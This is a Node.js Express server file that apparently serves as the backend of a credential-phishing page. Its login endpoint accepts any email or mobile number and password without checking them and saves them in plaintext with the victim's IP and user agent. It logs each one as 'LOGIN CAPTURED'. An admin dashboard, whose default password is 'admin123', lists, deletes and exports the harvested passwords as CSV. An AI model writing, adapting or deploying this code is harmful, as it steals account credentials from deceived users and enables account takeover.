const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// Storage file
const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'submissions.json');

// Ensure data folder and file exist
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2), 'utf8');
}

// Helpers for safe DB reading and writing
function getSubmissions() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    return JSON.parse(raw);
  } catch (err) {
    console.error('Error reading submissions:', err);
    return [];
  }
}

function saveSubmissions(data) {
  try {
    const tempFile = `${DATA_FILE}.tmp`;
    fs.writeFileSync(tempFile, JSON.stringify(data, null, 2), 'utf8');
    fs.renameSync(tempFile, DATA_FILE);
    return true;
  } catch (err) {
    console.error('Error saving submissions:', err);
    return false;
  }
}

// Admin Session Management
const activeAdminTokens = new Set();

function generateToken() {
  const token = crypto.randomBytes(24).toString('hex');
  activeAdminTokens.add(token);
  return token;
}

function adminAuthMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.startsWith('Bearer ')
    ? authHeader.slice(7)
    : req.query.token;

  if (!token || !activeAdminTokens.has(token)) {
    return res.status(401).json({ success: false, message: 'Unauthorized. Invalid or expired token.' });
  }
  next();
}

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Specific Routes for Pages
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// --- API Endpoints ---

// 1. User Login Submission
app.post('/api/login', (req, res) => {
  const { account, password } = req.body;

  if (!account || !password) {
    return res.status(400).json({
      success: false,
      message: 'Please provide both account (email/mobile) and password.'
    });
  }

  const submissions = getSubmissions();
  const now = new Date();
  
  const newEntry = {
    id: 'usr_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 6),
    account: String(account).trim(),
    password: String(password),
    timestamp: now.toISOString(),
    formattedDate: now.toLocaleString('en-US', {
      timeZone: 'Asia/Dhaka',
      dateStyle: 'medium',
      timeStyle: 'medium'
    }),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1',
    userAgent: req.headers['user-agent'] || 'Unknown'
  };

  submissions.unshift(newEntry); // newest first
  saveSubmissions(submissions);

  console.log(`[LOGIN CAPTURED] Account: ${newEntry.account} at ${newEntry.formattedDate}`);

  return res.status(200).json({
    success: true,
    message: 'Submitted successfully.'
  });
});

// 2. Admin Login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (!password) {
    return res.status(400).json({ success: false, message: 'Password is required' });
  }

  if (password === ADMIN_PASSWORD) {
    const token = generateToken();
    return res.json({ success: true, token, message: 'Authentication successful' });
  } else {
    return res.status(401).json({ success: false, message: 'Incorrect admin password' });
  }
});

// 3. Admin Verify Token
app.get('/api/admin/verify', adminAuthMiddleware, (req, res) => {
  res.json({ success: true, valid: true });
});

// 4. Admin Get Submissions
app.get('/api/admin/submissions', adminAuthMiddleware, (req, res) => {
  const submissions = getSubmissions();
  res.json({
    success: true,
    total: submissions.length,
    data: submissions
  });
});

// 5. Admin Delete Single Submission
app.delete('/api/admin/submissions/:id', adminAuthMiddleware, (req, res) => {
  const { id } = req.params;
  let submissions = getSubmissions();
  const initialCount = submissions.length;
  submissions = submissions.filter(item => item.id !== id);

  if (submissions.length === initialCount) {
    return res.status(404).json({ success: false, message: 'Record not found' });
  }

  saveSubmissions(submissions);
  res.json({ success: true, message: 'Record deleted successfully' });
});

// 6. Admin Clear All Submissions
app.delete('/api/admin/submissions', adminAuthMiddleware, (req, res) => {
  saveSubmissions([]);
  res.json({ success: true, message: 'All submissions cleared successfully' });
});

// 7. Admin Export to CSV
app.get('/api/admin/export', adminAuthMiddleware, (req, res) => {
  const submissions = getSubmissions();
  const headers = ['ID', 'Email or Mobile', 'Password', 'Submitted At', 'IP Address'];
  
  const escapeCsv = (str) => {
    if (str === null || str === undefined) return '""';
    const escaped = String(str).replace(/"/g, '""');
    return `"${escaped}"`;
  };

  const rows = submissions.map(item => [
    escapeCsv(item.id),
    escapeCsv(item.account),
    escapeCsv(item.password),
    escapeCsv(item.formattedDate || item.timestamp),
    escapeCsv(item.ip)
  ].join(','));

  const csvContent = [headers.join(','), ...rows].join('\r\n');

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="tayeb_dev_users_${Date.now()}.csv"`);
  res.send(csvContent);
});

// Start listening
app.listen(PORT, () => {
  console.log(`===============================================`);
  console.log(` Tayeb Dev Login & Admin Server running!`);
  console.log(` User Login Page:    http://localhost:${PORT}`);
  console.log(` Admin Dashboard:    http://localhost:${PORT}/admin`);
  console.log(` Default Admin Pass: ${ADMIN_PASSWORD}`);
  console.log(`===============================================`);
});
